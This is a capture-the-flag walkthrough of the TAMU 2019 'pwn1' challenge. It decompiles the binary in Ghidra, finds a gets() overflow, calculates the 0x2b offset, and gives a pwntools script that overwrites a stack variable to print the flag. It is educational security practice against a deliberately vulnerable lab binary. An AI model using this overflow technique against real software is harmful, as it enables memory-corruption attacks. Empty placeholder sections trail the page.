---
search:
  exclude: true
---
# TAMU 2019 pwn1

## Downloading the binary file 
    
    
    [ 192.168.100.126/24 ] [ /dev/pts/1 ] [binexp/2/pwn1]
    → wget https://github.com/guyinatuxedo/nightmare/raw/master/modules/04-bof_variable/tamu19_pwn1/pwn1
    --2021-02-23 13:16:19--  https://github.com/guyinatuxedo/nightmare/raw/master/modules/04-bof_variable/tamu19_pwn1/pwn1
    Resolving github.com (github.com)... 140.82.121.4
    Connecting to github.com (github.com)|140.82.121.4|:443... connected.
    HTTP request sent, awaiting response... 302 Found
    Location: https://raw.githubusercontent.com/guyinatuxedo/nightmare/master/modules/04-bof_variable/tamu19_pwn1/pwn1 [following]
    --2021-02-23 13:16:20--  https://raw.githubusercontent.com/guyinatuxedo/nightmare/master/modules/04-bof_variable/tamu19_pwn1/pwn1
    Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.111.133, 185.199.109.133, ...
    Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 7536 (7.4K) [application/octet-stream]
    Saving to: ‘pwn1’
    
    pwn1                                                                            100%[=======================================================================================================================================================================================================>]   7.36K  --.-KB/s    in 0.003s
    
    2021-02-23 13:16:20 (2.58 MB/s) - ‘pwn1’ saved [7536/7536]
    
    
    [ 192.168.100.126/24 ] [ /dev/pts/1 ] [binexp/2/pwn1]
    → file pwn1
    pwn1: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=d126d8e3812dd7aa1accb16feac888c99841f504, not stripped
    
    [ 192.168.100.126/24 ] [ /dev/pts/1 ] [binexp/2/pwn1]
    → chmod +x pwn1
    

` ![]()

## Solution 

First step, let's run the binary to see what it does:
    
    
    [ 192.168.100.126/24 ] [ /dev/pts/1 ] [binexp/2/pwn1]
    → ./pwn1
    Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
    What... is your name?
    nothing
    I don't know that! Auuuuuuuugh!
    
    [ 192.168.100.126/24 ] [ /dev/pts/1 ] [binexp/2/pwn1]
    → ./pwn1
    Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
    What... is your name?
    nobody
    I don't know that! Auuuuuuuugh!
    

similar to the previous 2 challenges, it prompts us for some text, and we need to put in something specific, so let's inspect the binary from ghidra:

![](5.png)
    
    
    /* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */
    
    undefined4 main(void)
    
    {
      int iVar1;
      char local_43 [43];
      int local_18;
      undefined4 local_14;
      undefined *local_10;
      
      local_10 = &stack0x00000004;
      setvbuf(stdout,(char *)0x2,0,0);
      local_14 = 2;
      local_18 = 0;
      puts(
          "Stop! Who would cross the Bridge of Death must answer me these questions three, ere theother side he see."
          );
      puts("What... is your name?");
      fgets(local_43,0x2b,stdin);
      iVar1 = strcmp(local_43,"Sir Lancelot of Camelot\n");
      if (iVar1 != 0) {
        puts("I don\'t know that! Auuuuuuuugh!");
                        /* WARNING: Subroutine does not return */
        exit(0);
      }
      puts("What... is your quest?");
      fgets(local_43,0x2b,stdin);
      iVar1 = strcmp(local_43,"To seek the Holy Grail.\n");
      if (iVar1 != 0) {
        puts("I don\'t know that! Auuuuuuuugh!");
                        /* WARNING: Subroutine does not return */
        exit(0);
      }
      puts("What... is my secret?");
      gets(local_43);
      if (local_18 == -0x215eef38) {
        print_flag();
      }
      else {
        puts("I don\'t know that! Auuuuuuuugh!");
      }
      return 0;
    }
    

looking at the disassembly code, we see a few interesting things. First of all our input text is stored in the variable 'local_43' and then it gets compared to the string of text 'Sir Lancelot of Camelot', depending on that it will either exit with the text 'i don't know that!' or proceed. so let's continue:
    
    
    [ 192.168.100.126/24 ] [ /dev/pts/1 ] [binexp/2/pwn1]
    → ./pwn1
    Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
    What... is your name?
    Sir Lancelot of Camelot
    What... is your quest?
    To seek the Holy Grail.
    What... is my secret?
    something secret
    I don't know that! Auuuuuuuugh!
    

Likewise, we also see that we need to input the seek the holy grail quest text, but then we do not know the secret passphrase yet. So we need to investigate further:
    
    
    puts("What... is my secret?");
      gets(local_43);
      if (local_18 == -0x215eef38) {
        print_flag();
      }
      else {
        puts("I don\'t know that! Auuuuuuuugh!");
      }
      return 0;
    

in here, our input text gets put into local_43, and then it is basically not even using our text, instead the binary file checks if local_18 is the same as -0x215eef38, so let's see what this is about:
    
    
     int local_18;
    
    [...]
    
      local_18 = 0;
    
    [...]
    
    if (local_18 == -0x215eef38) {
        print_flag();
      }
      else {
        puts("I don\'t know that! Auuuuuuuugh!");
    }
    

apparently local_18 is supposed to be an integer being set to 0, let's get more info on this integer:

![](6.png)
    
    
                                 **************************************************************
                                 *                          FUNCTION                          *
                                 **************************************************************
                                 undefined main(undefined1 param_1)
                 undefined         AL:1           
                 undefined1        Stack[0x4]:1   param_1                                 XREF[1]:     00010779(*)  
                 undefined4        Stack[0x0]:4   local_res0                              XREF[1]:     00010780(R)  
                 undefined1        Stack[-0x10]:1 local_10                                XREF[1]:     000108d9(*)  
                 undefined4        Stack[-0x14]:4 local_14                                XREF[1]:     000107ad(W)  
                 undefined4        Stack[-0x18]:4 local_18                                XREF[2]:     000107b4(W), 
                                                                                                       000108b2(R)  
                 undefined1        Stack[-0x43]:1 local_43                                XREF[5]:     000107ed(*), 
                                                                                                       00010803(*), 
                                                                                                       0001084f(*), 
                                                                                                       00010865(*), 
                                                                                                       000108a6(*)  
                                 main                                            XREF[5]:     Entry Point(*), 
                                                                                              _start:000105e6(*), 00010ab8, 
                                                                                              00010b4c(*), 00011ff8(*)  
            00010779 8d 4c 24 04     LEA        ECX=>param_1,[ESP + 0x4]
    
    

and let's get the information as to what our integer should be:

![](7.png)
    
    
            000108b2 81 7d f0        CMP        dword ptr [EBP + local_18],0xdea110c8
                     c8 10 a1 de
    
    

right here we see that the if statement compares our local_18 variable to the 0xdea110c8 value, if it is equal, it will call the print_flag function, so let's check out what we have about that function:

![](7.png)
    
    
    /* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */
    
    void print_flag(void)
    
    {
      FILE *__fp;
      int iVar1;
      
      puts("Right. Off you go.");
      __fp = fopen("flag.txt","r");
      while( true ) {
        iVar1 = _IO_getc((_IO_FILE *)__fp);
        if ((char)iVar1 == -1) break;
        putchar((int)(char)iVar1);
      }
      putchar(10);
      return;
    }
    

what we need to do here basically is that we have to use the gets call to overwrite the contents of local_18 to become 0xdea110c8 in order to get the flag.txt. Now looking at the following assembly code: 
    
    
                                 **************************************************************
                                 *                          FUNCTION                          *
                                 **************************************************************
                                 undefined main(undefined1 param_1)
                 undefined         AL:1           
                 undefined1        Stack[0x4]:1   param_1                                 XREF[1]:     00010779(*)
                 undefined4        Stack[0x0]:4   local_res0                              XREF[1]:     00010780(R)
                 undefined1        Stack[-0x10]:1 local_10                                XREF[1]:     000108d9(*)
                 undefined4        Stack[-0x14]:4 local_14                                XREF[1]:     000107ad(W)
                 undefined4        Stack[-0x18]:4 local_18                                XREF[2]:     000107b4(W),
                                                                                                       000108b2(R)
                 undefined1        Stack[-0x43]:1 local_43                                XREF[5]:     000107ed(*),
                                                                                                       00010803(*),
                                                                                                       0001084f(*),
                                                                                                       00010865(*),
                                                                                                       000108a6(*)
                                 main                                            XREF[5]:     Entry Point(*),
                                                                                              _start:000105e6(*), 00010ab8,
                                                                                              00010b4c(*), 00011ff8(*)
            00010779 8d 4c 24 04     LEA        ECX=>param_1,[ESP + 0x4]
    
    

we see that our input (local_43) starts at offset -0x43. we also see that local_18 starts at offset -0x18. so we need to take into account the following offset: **0x43 - 0x18 = 0x2b** between the start of our input and local_18. Then we will be able to overflow it and overwrite local_18 with 0xdea110c8 so let's write the python exploit:
    
    
    [ 192.168.100.126/24 ] [ /dev/pts/1 ] [binexp/2/pwn1]
    → ls -lash
    total 20K
    4.0K drwxr-xr-x 2 nothing nothing 4.0K Feb 23 13:35 .
    4.0K drwxr-xr-x 3 nothing nothing 4.0K Feb 23 13:16 ..
    4.0K -rw-r--r-- 1 nothing nothing   18 Feb 23 13:35 flag.txt
    8.0K -rwxr-xr-x 1 nothing nothing 7.4K Feb 23 13:16 pwn1
    
    [ 192.168.100.126/24 ] [ /dev/pts/1 ] [binexp/2/pwn1]
    → vim exploit.py
    
    
    
    
    from pwn import *
    
    target = process('./pwn1')
    
    payload = b""
    payload += b"0"*0x2b
    payload += p32(0xdea110c8)
    
    target.sendline("Sir Lancelot of Camelot")
    target.sendline("To seek the Holy Grail.")
    
    target.sendline(payload)
    target.interactive()
    
    

So first we create the payload ( 2b zeroes for the initial padding and then with the little endian value 0xdea110c8). After the payload is created, we send the 2 strings of text the binary wants to get past the first 2 questions, and then we send the payload. After that we get into an interactive shell to see what the result is:
    
    
    [ 192.168.100.126/24 ] [ /dev/pts/1 ] [binexp/2/pwn1]
    → vim exploit.py
    
    [ 192.168.100.126/24 ] [ /dev/pts/1 ] [binexp/2/pwn1]
    → python3 exploit.py
    [+] Starting local process './pwn1': pid 34429
    [*] Switching to interactive mode
    [*] Process './pwn1' stopped with exit code 0 (pid 34429)
    Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
    What... is your name?
    What... is your quest?
    What... is my secret?
    Right. Off you go.
    flag{g0ttem_b0yz}
    
    [*] Got EOF while reading in interactive
    $ :-)
    
    

And that's it! We have been able to print out the flag thanks to our buffer overflow payload.

![]()

## Title 

text 
    
    
    

` ![]()

## Title 

text 
    
    
    

` ![]()

